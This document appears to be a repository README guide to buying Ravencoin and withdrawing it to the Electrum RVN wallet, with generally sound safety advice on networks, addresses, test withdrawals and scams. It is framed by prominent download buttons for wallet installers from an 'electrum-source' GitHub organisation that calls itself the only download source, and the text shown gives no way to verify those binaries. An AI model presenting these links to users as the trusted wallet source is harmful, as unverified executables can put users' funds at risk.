![Electrum RVN](assets/banner-article.png)

# How to Buy Ravencoin for Electrum RVN

<!-- compact-download-block -->

<p align="center">From an exchange balance to your own address</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Buy RVN on an exchange or broker you already trust, then withdraw it to an address from your own wallet. The purchase is the easy half; the withdrawal is where the money is lost, because the network selector must read Ravencoin and the address must be one your wallet actually shows. Nothing is bought inside Electrum RVN itself.

## The two-step shape of it

Electrum RVN is a self-custody wallet: it holds keys, not accounts, and it has no order book, no card payment and no exchange. So buying is always: acquire RVN somewhere that sells it, then move it to an address you control.

That split is a feature. A wallet that also sells you coins holds your identity documents, your payment method and your balance in one place, and a wallet that never touches any of those is a much smaller target. It also means the wallet cannot freeze, limit or reverse anything - which cuts both ways.

## Step 1 - acquire RVN

Three routes, in descending order of how much of a paper trail they leave:

**A regulated exchange.** The common route: create an account, complete identity verification, deposit fiat, buy RVN. It is the easiest to use and the easiest to recover from if something goes wrong with a bank transfer. Withdrawal fees and minimums vary, and the RVN market on any given exchange is thinner than the market for large-cap coins, so check that RVN is actually listed for withdrawal rather than only for trading.

**A broker or card service.** Faster and more expensive, with a spread built into the price. Fine for a small first purchase; poor value for a large one.

**Peer to peer.** No intermediary, and every risk is yours: the counterparty, the payment method, the chargeback window. If you use it, keep the trade inside an escrow the platform operates, and never release funds on a promise.

Whichever route, the coins are on someone else's ledger until you withdraw. A balance on an exchange is a claim, not a holding.

## Step 2 - withdraw to your own address

This is the step to slow down for.

1. **Get an address from your wallet.** Receive tab, copy control - [how to find your Electrum RVN wallet address](https://github.com/electrum-source/download-and-setup/blob/main/find-your-electrum-rvn-wallet-address.md).
2. **Open the exchange's RVN withdrawal screen.** Not a generic "crypto withdrawal" screen; the asset must be RVN.
3. **Set the network to Ravencoin.** If the screen offers several networks for the same ticker - RVN, RVN (ERC-20), RVN (BEP-20) - the only one that arrives in this wallet is plain Ravencoin. An `0x` deposit address is the wrong answer even when the ticker matches.
4. **Paste the address.** Compare the first four and last four characters afterwards. Address-swapping malware changes the clipboard between copy and paste.
5. **Send a test amount first** if the withdrawal is large or the exchange is new to you. Confirm it arrives, then withdraw the rest to the same address.
6. **Check the fee and the minimum.** Some exchanges charge a flat withdrawal fee that is a large fraction of a small withdrawal; consolidating into one withdrawal is usually cheaper than several.

If the withdrawal is refused because the address is "invalid", the cause is almost always the network selector rather than the address. [Ravencoin address format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md) explains what the exchange is validating.

## What not to do

**Do not buy "RVN" as a token on another chain** and expect it to arrive. It is a different asset with the same ticker, and it cannot be sent to an `R` address.

**Do not send from an exchange to an exchange** as a way of moving value. Two custodial balances are two claims; moving between them adds fees and risk without giving you custody.

**Do not accept a "verification" transfer.** Nobody needs a payment from you to prove an address is valid, and a request to send a small amount "to activate" a wallet is theft with extra steps.

**Do not buy on the strength of a message.** Unsolicited offers, "recovery" services and schemes that promise a return are the same scam with different phrasing. [how safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) catalogues them.

## After it arrives

A confirmed balance in your own wallet is the point of the exercise, and it comes with two obligations.

**Write the seed down before the first withdrawal.** The wallet generated twelve words when you created it; if they are not on paper, the balance is one disk failure from gone - [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md).

**Decide how much stays online.** A working balance in the desktop wallet is fine. An amount you would not want to lose belongs in a cold-storage setup, where the keys never touch a networked machine: [Electrum RVN cold storage workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md).

Selling later is the mirror image of this process and has its own traps - [selling Ravencoin with Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/selling-ravencoin-with-electrum-rvn.md) - and moving the balance to a phone for spending is a normal send, not a migration: [Ravencoin mobile wallet vs Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-mobile-wallet-vs-electrum-rvn.md).

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. Install it before you buy, so the address exists when the withdrawal screen asks for one.

## FAQ

### Can I buy RVN inside Electrum RVN?

No. It is a self-custody wallet with no exchange, no card payment and no account. You buy elsewhere and withdraw to an address the wallet gives you. [What is Electrum RVN?](https://github.com/electrum-source/download-and-setup/blob/main/what-is-electrum-rvn.md) covers what the wallet does and does not include.

### Which network do I choose when withdrawing?

Ravencoin, sometimes labelled RVN. Any other network - ERC-20, BEP-20, or a wrapped token with the same ticker - will not arrive in this wallet and cannot be recovered from here.

### Is there a minimum purchase?

That is the seller's rule, not the wallet's: exchanges set minimum trades and minimum withdrawals, and the withdrawal minimum is usually the one that matters. The wallet has no minimum.

### Do I need to verify my identity?

At a regulated exchange, yes. That is a legal requirement on them, and it is one reason not to leave a large balance there. The wallet itself has no accounts and no identity checks.

### Should I withdraw everything at once?

Withdraw a test amount first if the amount matters, then the rest to the same address. One larger withdrawal usually costs less in fees than several smaller ones.

<!-- related-articles -->

## Related articles

- [How to Find Your Electrum RVN Wallet Address](https://github.com/electrum-source/download-and-setup/blob/main/find-your-electrum-rvn-wallet-address.md)
- [Ravencoin Address Format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md)
- [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md)
- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
